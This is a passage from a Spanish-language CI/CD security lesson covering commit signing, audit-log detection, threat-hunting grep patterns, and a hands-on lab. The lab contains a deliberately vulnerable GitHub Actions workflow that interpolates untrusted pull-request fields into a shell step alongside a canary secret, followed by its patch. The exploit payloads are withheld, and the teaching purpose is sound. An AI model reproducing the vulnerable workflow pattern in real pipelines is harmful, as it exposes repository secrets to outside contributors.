git commit -S -m "feat: signed commit"

# Verifica
git log --show-signature
```

### 16.2 Commits firmados con SSH

Desde Git 2.34, las claves SSH pueden firmar commits:

```bash
git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
```

### 16.3 sigstore/gitsign: firma sin clave

gitsign usa Fulcio, de Sigstore, para emitir un certificado efímero atado a tu identidad OIDC (Google, GitHub, Microsoft). No hay una clave de larga vida que gestionar o filtrar:

```bash
git config --global gpg.x509.program gitsign
git config --global gpg.format x509
git config --global commit.gpgsign true

git commit -am "chore: gitsign commit"
gitsign verify HEAD --certificate-identity=me@example.com --certificate-oidc-issuer=https://accounts.google.com
```

### 16.4 Branch protection con firmas obligatorias

En GitHub, habilita *Require signed commits* en la regla de branch protection. Cualquier push que contenga un commit sin firmar, o firmado de forma inválida, se rechaza.

## 17. Detección

Cada plataforma de CI/CD registra lo que hace. Convertir esos datos en señal exige baselines e integraciones.

### 17.1 Audit log de GitHub

Disponible a nivel de organización en los planes Business y Enterprise. Se envía a Splunk/Datadog/etc. mediante streaming. Eventos de alta señal:

- `workflow_run.completed` con runners no estándar.
- `repo.actions_enabled` y `repo.self_hosted_runner_online`.
- `personal_access_token.access_granted`.
- `oauth_application.transfer` e `integration_installation.repositories_added`.
- `protected_branch.destroy` y `repo.change_merge_setting`.

### 17.2 Resúmenes de jobs de GitHub Actions y attestation

Cada job publica un resumen y, si el workflow usa `attest-build-provenance`, una attestation firmada:

```yaml
- uses: actions/attest-build-provenance@v1
  with:
    subject-path: dist/app
```

### 17.3 Audit events de GitLab

Admin Area → Monitoring → Audit Events. Se pueden transmitir por webhook a un SIEM. Eventos clave: creación de pipelines en ramas protegidas, cambios de variables de CI, registro de runners, transferencias de proyectos.

### 17.4 Jenkins

Habilita el plugin audit-trail y transmite a syslog. Vigila `/script`, `/scriptText`, `/manage` y los cambios de configuración de jobs. Correlaciónalo con los listados de procesos de los agents mediante osquery.

### 17.5 Consultas de threat hunting

```bash
# GitHub: encuentra workflows que usen triggers peligrosos
gh api graphql -f query='
  query {
    organization(login:"victim") {
      repositories(first: 100) {
        nodes {
          nameWithOwner
          object(expression: "HEAD:.github/workflows") {
            ... on Tree { entries { name } }
          }
        }
      }
    }
  }'

# Grep de pipelines en busca de patrones conocidos como malos
grep -rE 'pull_request_target|workflow_run|issue_comment' .
grep -rE 'runs-on:\s*self-hosted' .
grep -rE 'permissions:\s*write-all' .
```

## 18. Práctica: workflow vulnerable, exploit, parche

Este laboratorio exige dos cuentas de GitHub (o una cuenta personal más una segunda identidad que controles) y un repositorio bajo tu cuenta principal. No apuntes a repositorios que no sean tuyos.

### 18.1 Monta el repositorio vulnerable

```bash
mkdir vuln-cicd-lab && cd vuln-cicd-lab
git init
mkdir -p .github/workflows
```

Crea `.github/workflows/vuln.yml`:

```yaml
name: PR Greeter (Vulnerable)
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: read
  pull-requests: write
  issues: write

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Debug info
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          FAKE_DEPLOY_KEY: ${{ secrets.FAKE_DEPLOY_KEY }}
        run: |
          echo "New PR: ${{ github.event.pull_request.title }}"
          echo "From branch: ${{ github.event.pull_request.head.ref }}"
          echo "By: ${{ github.event.pull_request.user.login }}"
```

Añade un secret de repositorio `FAKE_DEPLOY_KEY` con un valor del estilo `lab-canary-abc123` (nunca un secret real).

```bash
git add .
git commit -m "initial vulnerable workflow"
git branch -M main
git remote add origin https://github.com/<you>/vuln-cicd-lab.git
git push -u origin main
```

### 18.2 Qué demuestra el fuente

Desde una segunda identidad se abre un pull request cuyo título, y en una variante el nombre de la rama, rompe la interpolación del script. El entorno del job, incluido `FAKE_DEPLOY_KEY`, sale hacia un endpoint que controla quien hace el ejercicio. Esos payloads no se incluyen. El laboratorio que sí queda es el parche y la comprobación de que la misma entrada ya no sale del workflow.

### 18.3 Parche

Sustituye `.github/workflows/vuln.yml`:

```yaml
name: PR Greeter (Patched)
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: read
  pull-requests: write
  issues: write

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      # Haz checkout explícito del SHA head del fork, de forma aislada.
      # NO ejecutamos código del fork: solo leemos metadata.
      - name: Check out PR head at pinned SHA
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false

      - name: Post greeting safely
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Pasa los datos controlados por el fork por variables de entorno,
          # nunca por interpolación directa de expresiones en una shell.
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
          PR_USER: ${{ github.event.pull_request.user.login }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          REPO: ${{ github.repository }}
        run: |
          # Sanea: permite solo un subconjunto seguro de caracteres.
          safe_title=$(printf '%s' "$PR_TITLE" | tr -cd '[:alnum:] .,:;!?_-' | head -c 200)
          gh api "/repos/$REPO/issues/$PR_NUMBER/comments" \
            -f body="Thanks for PR titled: $safe_title"
```

Los dos controles defensivos:

- Los datos controlados por el fork fluyen por variables de entorno, no por interpolación directa. La shell ve `"$PR_TITLE"`, que es una expansión de variable en tiempo de shell y no puede inyectar sintaxis.
- Incluso el valor saneado tiene límite de longitud y restricción de caracteres antes de enviarse a una API que podría volver a renderizarlo.

### 18.4 Verificación

Repite las mismas entradas del fuente contra el workflow parcheado. Confirma:

- El webhook no recibe nada.
- El comentario publicado contiene la cadena de inyección en crudo, como texto inerte.

### 18.5 Extra

- Añade actionlint y zizmor a CI como checks obligatorios.
- Habilita branch protection que exija commits firmados en `main`.
- Rota `FAKE_DEPLOY_KEY` y confirma que el valor viejo queda revocado.

## 19. Ejercicios

**Guiados** (hay walk-throughs en el manual del laboratorio)

- **Audita los triggers de una organización real.** Clona al menos diez repos públicos que elijas. Enumera cada workflow que use `pull_request_target`, `workflow_run` o `issue_comment`. Para cada uno, identifica si las expresiones controladas por el fork aterrizan en un paso `run:`. Produce una tabla de repo, workflow, línea y riesgo.
- **Enumeración de runners self-hosted.** Usando `gh api /orgs/<org>/actions/runners` (contra organizaciones que tengas permiso de inspeccionar), lista todos los runners self-hosted. Cruza qué repositorios están configurados para usarlos y si esos repositorios aceptan pull requests de forks. Informa de las tres combinaciones de mayor riesgo.
- **Triage de filtración de secrets.** Clona tus propios proyectos históricos. Corre `trufflehog git file://. --only-verified` y `gitleaks detect --source . --log-opts="--all"`. Para cada hallazgo verificado, rota la credencial y registra el timestamp de la rotación. Confirma que la credencial vieja falla contra la API.

**Independientes** (diseña y defiende tu solución)

- **Construye un pipeline de deploy solo con OIDC.** Reescribe el job de deploy de una aplicación demo pequeña para usar la federación OIDC de GitHub Actions hacia AWS (sin access key estática en ningún sitio). Documenta tu trust policy de IAM, el workflow y el ámbito exacto del rol asumido. Demuestra que no se guarda ninguna credencial de larga vida en ningún sitio.
- **Publica un contenedor firmado y atestiguado.** Toma una app de ejemplo pública. Construye la imagen, fírmala con cosign sin clave, genera un SBOM con syft, atestigua el SBOM y la provenance SLSA, y escribe una política de Kyverno o de Sigstore Policy Controller que solo admita imágenes firmadas por la identidad de tu workflow. Demuestra que una imagen no autorizada se rechaza en la admisión.
- **Tabletop de compromiso y recuperación.** Supón que `tj-actions/changed-files@v40` fue comprometida y que tu workflow la usó hace tres meses. Escribe el runbook de respuesta a incidentes: qué secrets rotar, qué artefactos dejar de confiar, a qué consumidores downstream avisar y cómo verificar que no queda persistencia en tu entorno de build.

## 20. Resumen y puntero a la lección siguiente

CI/CD es la superficie de ataque de mayor palanca en la mayoría de las organizaciones de ingeniería modernas. Un solo workflow, action o dependencia comprometidos puede propagarse a cada entorno que toque el pipeline, y puede persistir a través de las salidas de build mucho después de que se cierre el acceso original. Los temas que se repiten:

- Los runners son privilegiados. Trata cada bloque `run:` como ejecución de código en un sistema que guarda secrets reales.
- Las entradas controladas por un fork nunca deben llegar a una shell mediante interpolación directa de expresiones. Enrútalas por variables de entorno, sánalas y usa los triggers de menor ámbito.
- Los builds efímeros, herméticos y reproducibles encogen la superficie de ataque de SolarWinds.
- Fija las dependencias a digests, firma los artefactos con cosign, atestigua la provenance con in-toto/SLSA y haz cumplir esas firmas en el momento del deploy.
- Rota ante cada exposición sospechada. El escaneo es lo mínimo; los secrets verificados por trufflehog están comprometidos aunque todavía no se hayan explotado.
- La detección vive en el audit log. Transmítelo a un SIEM y caza registros de runners self-hosted, cambios de ramas protegidas y adiciones inusuales de workflows.

En la lección siguiente —Lección 07: Kubernetes Security Fundamentals— bajamos una capa, del pipeline al runtime al que despliega. Vamos a mirar fronteras de RBAC, pod security standards, admission control, abuso de tokens de service account y los caminos de escape clásicos de un pod al nodo y del nodo al clúster. Las imágenes de contenedor firmadas y atestiguadas en esta lección son las entradas de las políticas de admisión que vamos a diseñar en la siguiente.
